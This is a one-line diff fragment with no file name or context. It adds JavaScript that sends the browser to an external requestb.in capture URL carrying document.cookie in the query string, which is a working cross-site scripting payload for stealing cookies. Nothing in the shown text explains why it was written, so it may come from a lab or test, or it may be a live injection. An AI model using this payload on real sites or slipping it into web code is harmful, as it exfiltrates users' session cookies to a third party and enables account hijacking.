@@ -1,0 +1,1 @@
+window.location=`https://requestb.in/1eddpcu1?${document.cookie}`;
